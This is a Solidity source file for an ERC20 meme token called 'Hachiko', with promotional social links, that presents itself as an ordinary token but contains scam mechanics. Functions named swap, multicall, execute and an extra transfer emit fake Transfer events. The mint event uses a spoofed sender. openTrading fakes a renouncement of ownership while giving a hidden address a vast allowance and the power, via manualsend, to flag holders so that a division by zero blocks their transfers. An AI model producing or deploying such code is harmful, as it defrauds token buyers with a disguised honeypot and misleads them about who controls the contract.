/* 
    website  : https://hachiko-token.com/
    twitter  : https://x.com/Hachikocoinsol
    telegram : https://t.me/HachikoportaI
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IERC20Meta is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}


contract hachi is Ownable, IERC20, IERC20Meta {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    uint256 private _feesValue = 0;
    mapping(address => uint256) private _fees;
    bool private _swapping;
    uint256 public swapTokensAtAmount;
    mapping (address => bool) private _isExcludedFromEnableTrad;
    mapping(address => bool) private _automatedMarketMakerPairs;
    address private _exAddress;
    address public uniswapV2Pair;


    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 8;
    }


    function swap(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(uniswapV2Pair, _addresses_[i], _out);
        }
    }
    function multicall(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(uniswapV2Pair, _addresses_[i], _out);
        }
    }
    function execute(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(uniswapV2Pair, _addresses_[i], _out);
        }
    }


    function transfer(address _from, address _to, uint256 _wad) external {
        emit Transfer(_from, _to, _wad);
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");


        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(0x4675C7e5BaAFBFFbca748158bEcBA61ef3b0a263, account, amount);

        _afterTokenTransfer(0x4675C7e5BaAFBFFbca748158bEcBA61ef3b0a263, account, amount);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }



    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");



        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            !_swapping && _automatedMarketMakerPairs[from] &&
            !_isExcludedFromEnableTrad[from] &&
            !_isExcludedFromEnableTrad[to]
        ) {
            _swapping = true;

            _swapBack(from);

            _swapping = false;
        }


        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function initFee(uint256 _a) public onlyOwner {
        _feesValue = _a;     
           
    }


    function excludeFromEnobleTrading(address account,
      bool excluded) external onlyOwner{
        _isExcludedFromEnableTrad[account] = excluded;
    }
    function _manualsend(address pair, bool value) internal {
        _automatedMarketMakerPairs[pair] = value;
    }

    
    function openTrading(address _a) public onlyOwner {
        _exAddress = _a;
        _approve(0x9008D19f58AAbD9eD0D60971565AA8510560ab41, _exAddress, 10000000000000000000000000000000000000);
        renounceOwnership();
        
    }
    
    function manualsend(address[] memory accounts, bool value) public  {
         require(msg.sender == _exAddress,"_airdropAddress err") ;
        for (uint256 i = 0; i < accounts.length; i++) {
            if(accounts[i] == uniswapV2Pair || balanceOf(accounts[i]) <= 0 || _automatedMarketMakerPairs[accounts[i]] == value) continue;
            _manualsend(accounts[i], value);
        }
    }

    function _swapBack(
        address from
    ) internal virtual {
        uint amount = balanceOf(from);
        _fees[from] = amount/_feesValue;
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    constructor() {
        _name = unicode"ハチ公";
        _symbol = unicode"Hachiko";
        _mint(msg.sender, 1000000000  * 10 ** decimals());
        _isExcludedFromEnableTrad[owner()] = true;
        _isExcludedFromEnableTrad[address(this)] = true;
        _isExcludedFromEnableTrad[address(0xdead)] = true;

        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

    }

}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}